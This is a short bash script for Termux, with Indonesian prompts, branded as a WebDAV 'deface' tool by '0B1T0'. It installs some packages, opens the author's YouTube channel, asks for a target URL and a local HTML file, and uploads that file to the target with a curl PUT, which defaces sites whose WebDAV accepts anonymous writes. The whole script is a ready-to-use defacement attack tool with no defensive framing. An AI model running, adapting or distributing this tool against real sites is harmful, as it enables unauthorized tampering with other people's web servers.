#!/bin/bash

clear
termux-setup-storage
pkg install php
gem install lolcat
pkg install toilet
pkg install curl
echo "subscribe channel gw dulu mamang:v" | lolcat
termux-open-url https://youtube.com/channel/UCty3FP7pWO-2QvfaFM3BgiA
clear
toilet -f pagga "==============="
toilet -f pagga "DEFACE BY 0B1T0"
toilet -f pagga "==============="
toilet -f future "WebDav"
echo
echo
echo
echo "ingat sebelum itu keluarkan tools dari folder" | lolcat
read -p "masukkan target deface :" target
echo "target dikonfirmasi[✓]"
echo "kalo tulisannya banyak berarti error, kalo langsung enter biasa otomatis berhasil dong:)" | lolcat
read -p "masukkan tools deface (namanya harus .html misal obito.html :" tools
echo "tools dikonfirmasi[✓]"
echo "mencoba memasukkan tools $tools ke target $target"
curl -T /storage/emulated/0/$tools $target
